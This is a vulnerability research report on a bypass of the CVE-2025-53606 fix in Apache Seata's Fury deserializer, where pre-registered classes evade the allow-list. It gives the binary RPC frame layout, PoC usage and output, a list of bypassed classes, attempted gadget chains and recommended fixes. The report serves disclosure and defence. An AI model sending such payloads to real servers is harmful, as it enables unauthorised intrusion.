# Bypass Analysis: CVE-2025-53606

## Executive Summary

The fix for CVE-2025-53606 (commit `d2a18aef82c08535e4134642070c39d98654f0f6`) replaces the broken lambda-based `ClassChecker` with Fury's built-in `AllowListChecker(STRICT)`. While this fix **successfully blocks the critical RCE-capable attack vectors** (java.net.URL DNS callback, java.io.File, java.lang.Runtime, JNDI injection classes), it is **architecturally incomplete** due to a pre-registration bypass in Apache Fury's class resolution mechanism.

**36 non-whitelisted Java classes bypass the AllowListChecker** because Fury pre-registers built-in serializers during initialization, and pre-registered classes are resolved via numeric class ID lookup (`registeredId2ClassInfo[]`) which does NOT invoke the ClassChecker. This was confirmed via both JVM-level tests and network-level exploitation against the patched Seata 2.5.0 server.

**Bypass severity: LOW** — The bypassed types are safe value types (AtomicInteger, BigDecimal, Date, etc.) that do not enable direct RCE. However, this represents a security model violation and creates future risk if Fury adds dangerous pre-registered types.

---

## Bypass Hypothesis

### Hypothesis 1: Fury Pre-Registration Class Cache Bypass (CONFIRMED)

**What we expected**: Fury's `ClassResolver` pre-registers built-in serializers for common Java types during `ClassResolver.addDefaultSerializers()`, which is called during Fury initialization in `Fury.<init>()`. The `AllowListChecker` is set AFTER initialization via `f.getClassResolver().setClassChecker(checker)`. Pre-registered classes should be resolved during deserialization via numeric class ID lookup, bypassing the ClassChecker entirely.

**Why we believed the fix doesn't cover this**: The fix in `FurySerializerFactory.java` sets the ClassChecker after calling `Fury.builder()...build()`. At that point, all default serializers are already registered in the internal `registeredId2ClassInfo[]` array. During deserialization, when the binary stream contains a numeric class ID (as opposed to a full class name), Fury resolves the class directly from this array without invoking `classChecker.checkClass()`.

**Evidence from Fury 0.8.0 source code**:

```java
// ClassResolver.readClassInfo() — resolves registered classes by ID
public ClassInfo readClassInfo(MemoryBuffer buffer, ClassInfo classInfoCache) {
    int header = buffer.readVarUint32Small14();
    if ((header & 0b1) != 0) {
        return readClassInfoByCache(buffer, classInfoCache, header); // Name-based (checked)
    } else {
        return getClassInfo((short) (header >> 1)); // ID-based (NOT checked)
    }
}

// getOrUpdateClassInfo() — direct array lookup, no ClassChecker
private ClassInfo getOrUpdateClassInfo(short classId) {
    ClassInfo classInfo = registeredId2ClassInfo[classId]; // No checker!
    if (classInfo.serializer == null) {
        addSerializer(classInfo.cls, createSerializer(classInfo.cls));
        classInfo = classInfoMap.get(classInfo.cls);
    }
    return classInfo;
}
```

### Hypothesis 2: Whitelisted `org.apache.seata.*` Classes as Gadgets (NOT EXPLOITABLE)

The whitelist includes the wildcard `"org.apache.seata.*"`, allowing ALL Seata classes. We investigated whether any Seata protocol classes could be used as gadgets. The protocol request/response classes (e.g., `GlobalBeginRequest`, `BranchRegisterRequest`) are simple data carriers with String/enum fields — no dangerous behavior in `hashCode()`, `equals()`, constructors, or field setters.

### Hypothesis 3: FuryUndoLogParser Unfixed Sibling (CONFIRMED but not server-reachable)

`FuryUndoLogParser.java` uses `requireClassRegistration(false)` with NO ClassChecker at all. However, the `seata-rm-datasource` JAR is NOT on the server classpath (confirmed: absent from `/seata-server/libs/`). This is a client-side component requiring database write access to exploit — not reachable via the RPC port.

---

## Bypass Method

### Technical Description

The bypass exploits the initialization order gap between Fury's class registration and the AllowListChecker installation:

1. **Fury initialization** (`Fury.builder()...build()`) calls `ClassResolver.initialize()` → `addDefaultSerializers()`, which pre-registers ~50+ common Java classes with numeric class IDs
2. **ClassChecker installation** happens AFTER initialization: `f.getClassResolver().setClassChecker(checker)`
3. **Serialization**: The attacker uses an unrestricted Fury instance (same configuration: `Language.JAVA`, `refTracking=true`, `CompatibleMode.COMPATIBLE`) to serialize objects containing pre-registered types. Fury writes numeric class IDs for these types.
4. **Deserialization on server**: The server reads the numeric class ID from the binary stream and resolves it via `registeredId2ClassInfo[]` array lookup — this code path does NOT invoke the ClassChecker
5. **Result**: Non-whitelisted pre-registered types are deserialized successfully despite the AllowListChecker

### Attacker Requirements

- Network access to Seata RPC port (TCP 8091)
- No authentication required
- Knowledge of Fury 0.8.0 pre-registered type IDs (determined by using the same Fury library version)

### Payload Format

Standard Seata RPC v1 binary frame with FURY codec byte (0x56), containing Fury-serialized objects using ONLY pre-registered types:

```
Offset  Size  Field               Value
0-1     2B    Magic               0xDA 0xDA
2       1B    Version             0x01
3-6     4B    Full Length         (16 + body length)
7-8     2B    Head Length         0x00 0x10
9       1B    Message Type        0x00 (SYNC_REQUEST)
10      1B    Codec               0x56 (FURY)
11      1B    Compressor          0x00 (NONE)
12-15   4B    Request ID          0x00 0x00 0x00 0x01
16+     NB    Body                Fury-serialized bypass payload
```

---

## Bypass Script

**Location**: `poc/bypass_poc.py`

**Supporting files**:
- `poc/BypassTest.java` — JVM-level bypass test (16 vectors)
- `poc/BypassEnumeration.java` — Comprehensive enumeration of bypassed types
- `poc/PriorityQueueBypass.java` — PriorityQueue gadget chain attempt
- `poc/NetworkBypassPayloadGen.java` — Generates Fury payloads for network PoC

**Usage**:
```bash
python3 bypass_poc.py <target_host> <target_port> [container_name]
python3 bypass_poc.py localhost 8092 cve-2025-53606-patched
```

---

## Test Results

### Network-Level Bypass Against Patched Server (Seata 2.5.0)

**All 4 bypass payloads were successfully deserialized on the patched server:**

```
========================================================================
CVE-2025-53606 BYPASS PoC: AllowListChecker Pre-Registration Bypass
========================================================================
Target: localhost:8092 (patched: apache/seata-server:2.5.0)

[*] Testing bypass payload: uri_map
    Description: HashMap<URI, String> — URI is pre-registered, bypasses AllowListChecker
    Target class: java.net.URI
  Sending 93 bytes (header: 16, body: 77)
  [+] BYPASS CONFIRMED: Non-whitelisted class deserialized!
      Evidence: rpcMessage body[{http://attacker.example.com/cve-2025-53606-bypass=bypass-proof}]

[*] Testing bypass payload: priority_queue
    Description: PriorityQueue<String> — PriorityQueue is pre-registered, not in whitelist
    Target class: java.util.PriorityQueue
  Sending 58 bytes (header: 16, body: 42)
  [+] BYPASS CONFIRMED: Non-whitelisted class deserialized!
      Evidence: rpcMessage body[[bypass_proof_1, bypass_proof_2]]

[*] Testing bypass payload: concurrent_hashmap
    Description: ConcurrentHashMap<String,String> — CHM pre-registered, not in whitelist
    Target class: java.util.concurrent.ConcurrentHashMap
  Sending 92 bytes (header: 16, body: 76)
  [+] BYPASS CONFIRMED: Non-whitelisted class deserialized!
      Evidence: rpcMessage body[{bypass_key=bypass_value_from_non_whitelisted_ConcurrentHashMap}]

[*] Testing bypass payload: atomic_integer
    Description: HashMap<String,AtomicInteger> — AtomicInteger pre-registered, not in whitelist
    Target class: java.util.concurrent.atomic.AtomicInteger
  Sending 47 bytes (header: 16, body: 31)
  [+] BYPASS CONFIRMED: Non-whitelisted class deserialized!
      Evidence: rpcMessage body[{bypass_atomic=1337}]

RESULTS: 4/4 payloads bypassed the AllowListChecker on patched server
```

### JVM-Level Bypass Enumeration

**36 non-whitelisted classes bypass the AllowListChecker** (tested inside the patched container using the exact same configuration as `FurySerializerFactory`):

| Category | Bypassed Classes |
|---|---|
| **Atomic types** | AtomicInteger, AtomicLong, AtomicBoolean, AtomicReference |
| **Math types** | BigDecimal, BigInteger |
| **String builders** | StringBuilder, StringBuffer |
| **Date/Time** | Date, java.sql.Date, Timestamp, Locale, Currency |
| **Collections** | Vector, ConcurrentHashMap, ArrayDeque, PriorityQueue, BitSet |
| **Collections wrappers** | EmptyList, EmptyMap, EmptySet, SingletonList, SingletonMap, UnmodifiableList, UnmodifiableMap, SynchronizedList |
| **Network** | URI |
| **Utility** | UUID, Optional, Pattern |
| **Arrays** | int[], byte[], boolean[], String[], Object[], Integer[] |

### Comparison: Original PoC vs Bypass PoC on Patched Server

| Payload | Original PoC (Seata 2.4.0) | Original PoC (Seata 2.5.0) | Bypass PoC (Seata 2.5.0) |
|---|---|---|---|
| java.io.File | ✓ Deserialized | ✗ BLOCKED | N/A |
| java.net.URL (DNS) | ✓ Deserialized | ✗ BLOCKED | N/A |
| java.net.URI | N/A | N/A | ✓ BYPASSED |
| PriorityQueue | N/A | N/A | ✓ BYPASSED |
| ConcurrentHashMap | N/A | N/A | ✓ BYPASSED |
| AtomicInteger | N/A | N/A | ✓ BYPASSED |

**Key distinction**: The original dangerous payloads (URL, File) are properly blocked. The bypass uses a different technique (pre-registered types) that evades the AllowListChecker but currently lacks RCE-capable gadget chains.

### Gadget Chain Escalation Attempts

| Attempt | Result | Notes |
|---|---|---|
| PriorityQueue + Comparator | BLOCKED | PriorityQueue bypasses checker, but Comparator classes are NOT pre-registered → blocked by AllowListChecker |
| HashMap<URI, String> | BYPASSED | URI deserialized with attacker content, but URI.hashCode() does NOT trigger DNS lookups (unlike URL) |
| AtomicReference<URL> | BLOCKED | AtomicReference bypasses, but URL inside it is still checked by loadClass() → blocked |
| TreeMap + Comparator | BLOCKED | TreeMap is whitelisted, but ReverseComparator blocked by AllowListChecker |
| Nested HashMap with AtomicInteger | BYPASSED | Both HashMap and AtomicInteger allowed, but no dangerous side effect |

---

## Severity Assessment

### Current Impact: LOW

The bypass is **confirmed** and **reproducible** but has **limited practical impact**:

1. **No direct RCE**: None of the 36 pre-registered types enable arbitrary code execution
2. **No DNS callback**: `java.net.URI` (bypassed) does NOT trigger DNS lookups during hashCode() — unlike `java.net.URL` (blocked)
3. **No JNDI injection**: JNDI classes are not pre-registered
4. **Gadget chain blocked**: PriorityQueue bypasses the checker but its Comparator field is properly checked, preventing known PQ-based gadget chains

### Security Model Violation: MEDIUM

1. **Whitelist bypass**: The AllowListChecker's STRICT mode is supposed to allow ONLY whitelisted classes, but 36+ types are silently exempted
2. **Future risk**: If Apache Fury 0.9.x or later adds pre-registered serializers for dangerous types (e.g., custom serializers for reflection-capable classes), they would bypass the fix without any code change in Seata
3. **Attack surface expansion**: Attacker controls which pre-registered types are deserialized and their field values, increasing the combinatorial space for future gadget discovery

### Recommended Additional Fix

The fix should use one of these approaches to eliminate the pre-registration bypass:

**Option A (Best)**: Use `requireClassRegistration(true)` and explicitly register only needed classes:
```java
Fury f = Fury.builder()
        .withLanguage(Language.JAVA)
        .requireClassRegistration(true)  // Block ALL unregistered classes
        .withRefTracking(true)
        .withCompatibleMode(CompatibleMode.COMPATIBLE)
        .build();
// Register ONLY the specific classes in the whitelist
for (Class<?> cls : SerializerSecurityRegistry.getAllowClassType()) {
    f.register(cls);
}
```

**Option B**: Set `AllowListChecker` BEFORE building Fury (requires Fury API change):
```java
AllowListChecker checker = new AllowListChecker(AllowListChecker.CheckLevel.STRICT);
checker.allowClasses(SerializerSecurityRegistry.getAllowClassPattern());
Fury f = Fury.builder()
        .withClassChecker(checker)  // Set before initialization
        .build();
```

**Option C**: After setting the checker, validate and remove pre-registered types not in the whitelist:
```java
AllowListChecker checker = new AllowListChecker(AllowListChecker.CheckLevel.STRICT);
f.getClassResolver().setClassChecker(checker);
checker.allowClasses(SerializerSecurityRegistry.getAllowClassPattern());
// Additionally, disallow all pre-registered types not in whitelist
checker.disallowClass("java.net.URI");
checker.disallowClass("java.util.PriorityQueue");
checker.disallowClass("java.util.concurrent.*");
// ... etc
```

---

## Additional Findings

### Finding 2: FuryUndoLogParser Not Fixed (Sibling Component)

**File**: `rm-datasource/src/main/java/org/apache/seata/rm/datasource/undo/parser/FuryUndoLogParser.java`

```java
private static final ThreadSafeFury FURY = new ThreadLocalFury(classLoader -> Fury.builder()
        .withLanguage(Language.JAVA)
        .requireClassRegistration(false)  // Allows ANY class
        .withRefTracking(true)
        .withClassLoader(classLoader)
        .withCompatibleMode(CompatibleMode.COMPATIBLE)
        .build());  // NO ClassChecker set at all!
```

- Uses `requireClassRegistration(false)` with **NO ClassChecker** — worse than the original CVE
- NOT on the server classpath (confirmed: `seata-rm-datasource-*.jar` absent from `/seata-server/libs/`)
- This is a client-side component for undo log parsing from database storage
- Exploitation requires database write access (different threat model)
- NOT addressed in the CVE-2025-53606 fix commit

### Finding 3: Deny List Unused in Fury Serializer

The `SerializerSecurityRegistry` maintains a deny list containing `javax.naming.InitialContext`, `javax.net.ssl.*`, `com.unboundid.ldap.*`, and `java.lang.Runtime`. The patched `FurySerializerFactory` only calls `checker.allowClasses()` — it never calls `checker.disallowClasses()` with the deny list. In STRICT mode this is technically redundant (anything not in the allow list is blocked), but the deny list patterns are completely unused by the Fury serializer.

---

## Confidence Level

**Bypass confirmed with HIGH confidence**:
- Tested via JVM-level direct deserialization within the patched container
- Tested via network-level Seata RPC protocol against patched server (TCP 8091)
- Root cause confirmed in Fury 0.8.0 source code (numeric class ID resolution bypasses ClassChecker)
- Tested 36 individual non-whitelisted types — all bypassed consistently
- Attacker-controlled content (URI, strings) confirmed in server logs

**RCE escalation NOT achieved (LOW confidence of future escalation)**:
- No pre-registered type currently enables direct code execution
- Known gadget chain components (PriorityQueue+Comparator) are partially blocked
- Future Fury versions or classpath changes could alter the risk profile
